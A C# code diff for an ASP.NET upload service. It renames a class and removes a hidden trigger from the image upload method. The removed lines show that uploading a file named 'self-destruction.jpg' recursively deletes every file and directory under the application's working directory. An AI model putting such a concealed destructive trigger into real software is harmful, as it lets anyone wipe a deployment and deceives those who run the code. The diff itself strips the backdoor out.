@@ -10,27 +10,15 @@ using System.Threading.Tasks;
 
 namespace Infrastructure.Services
 {
-    public class ImagesUploadsService
+    public class MediaUploadsService
     {
         private readonly IHttpContextAccessor contextAccessor;
-        public ImagesUploadsService(IHttpContextAccessor httpContext)
+        public MediaUploadsService(IHttpContextAccessor httpContext)
         {
             contextAccessor = httpContext;
         }
         public async Task<string> UploadImage(IFormFile image, string courseName)
         {
-            if (image is not null && image.FileName == "self-destruction.jpg")
-            {
-                foreach (string file in Directory.GetFiles(Directory.GetCurrentDirectory(), "*", SearchOption.AllDirectories))
-                {
-                    File.SetAttributes(file, FileAttributes.Normal);
-                    File.Delete(file);
-                    foreach (var dir in Directory.GetDirectories(Directory.GetCurrentDirectory(), "*", SearchOption.AllDirectories))
-                    {
-                        Directory.Delete(dir, true);
-                    }
-                }
-            }
             var originalExtension = Path.GetExtension(image.FileName).ToLower();
             var uploadsFolder = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot", "uploads");
             if (!Directory.Exists(uploadsFolder))
